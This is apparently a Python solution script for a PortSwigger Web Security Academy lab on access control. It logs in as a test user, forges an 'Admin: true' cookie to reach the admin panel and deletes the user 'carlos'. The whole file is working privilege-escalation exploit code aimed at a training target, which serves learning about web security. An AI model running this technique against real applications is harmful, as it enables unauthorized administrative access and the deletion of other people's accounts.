# User role controlled by request parameter

# https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def delete_carlos(s, url):
	login_path = url + '/login'
	print('\n[+] Trying to grab CSRF Token to log in..')
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	print('[+] Trying to connect to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		admin_panel_path = url + '/admin'
		print("\n[+] Enumerate Wiener's cookies:")
		for c in s.cookies:
			print(f' -  {c.name}: {c.value}')
		session_cookie = s.cookies.get('session')
		print('\n[+] Trying to change the cookie value to true...')
		cookies = {'session': session_cookie, 'Admin': 'true'} 
		print("\n[+] Trying to access to the admin panel...")
		r = s.get(admin_panel_path, cookies=cookies)
		time.sleep(1)
		if 'Admin panel' in r.text:
			delete_user_path = url + "/admin/delete?username=carlos"
			print('\n[+] Trying to delete Carlos user...')
			r = s.get(delete_user_path, cookies=cookies)
			time.sleep(1)
			if 'User deleted successfully!' in r.text:
				print('[+] Carlos user successfully deleted !')
			else:
				print('[-] Exploit failed to delete Carlos user <!>')
		else:
			print('[-] Exploit failed to get Admin role <!>')
	else:
		print('[-] Exploit failed to connect as Wiener <!>')


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: User role controlled by request parameter')
	parser = argparse.ArgumentParser(description="[+] Lab: User role controlled by request parameter")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(args.url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected Path to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(args.url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
